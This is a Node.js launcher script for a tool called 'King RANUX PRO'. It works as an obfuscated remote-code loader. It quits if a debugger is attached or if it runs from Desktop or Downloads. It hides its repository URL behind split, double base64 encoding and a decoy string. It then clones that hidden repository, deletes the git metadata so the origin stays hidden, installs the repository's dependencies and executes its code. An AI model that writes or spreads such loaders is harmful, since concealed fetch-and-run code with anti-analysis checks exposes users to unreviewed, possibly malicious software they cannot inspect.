const { execSync } = require("child_process");
const fs = require("fs");
const path = require("path");

if (process.execArgv.join("").includes("inspect")) {
  console.log("❌ Debug mode detected. Exiting...");
  process.exit(1);
}

const FAKE_CORE_1 = "aHR0cHM6Ly9naXRodWIuY29tL2Zha2UvZmFrZS5naXQ=";
function useless() {
  return Buffer.from(FAKE_CORE_1, "base64").toString();
}

function buildHiddenString() {
  const parts = [
    "YUhSM", "GNITT", "ZMeTl", "uYVh0",
    "b2R3Qi", "5jb20v",
    "cjRiaX", "JpZGdl",
    "LWRldi9", "ueC1ic", "mlkZ2Uu", "Z2l0"
  ];
  return parts.join("");
}

const STEP1 = Buffer.from(buildHiddenString(), "base64").toString("utf-8");
const CORE_URL = Buffer.from(STEP1, "base64").toString("utf-8");

const CORE_DIR = path.join(__dirname, "core");

if (__dirname.includes("Desktop") || __dirname.includes("Downloads")) {
  console.log("❌ Unauthorized environment detected.");
  process.exit(1);
}

if (fs.existsSync(CORE_DIR)) {
  console.log("🧹 Removing old core...");
  execSync("rm -rf core", { stdio: "inherit" });
}

try {
  console.log("🧼 Clearing npm cache...");
  execSync("npm cache clean --force", { stdio: "inherit" });
} catch {}

console.log("⬇️ Downloading latest King RANUX PRO core...");
try {
  execSync(`git clone ${CORE_URL} core`, { stdio: "inherit" });
  console.log("✅ Latest core downloaded.");
} catch (e) {
  console.log("❌ Failed to download core.");
  process.exit(1);
}

if (fs.existsSync(path.join(CORE_DIR, ".git"))) {
  try {
    execSync("rm -rf core/.git");
    console.log("🧹 Git metadata removed (origin hidden).");
  } catch {}
}

console.log("📥 Installing core dependencies...");
try {
  execSync("cd core && npm install", { stdio: "inherit" });
  console.log("✅ Core dependencies installed.");
} catch (e) {
  console.log("❌ Failed to install core dependencies.");
  process.exit(1);
}

if (!fs.existsSync(path.join(__dirname, "config.js"))) {
  console.log("❌ config.js not found!");
  console.log("👉 Please create config.js with your SESSION_ID.");
  process.exit(1);
}

console.log("🚀 Launching King RANUX PRO...");
try {
  require("./core/index.js");
} catch (e) {
  console.log("❌ Failed to start core:", e);
}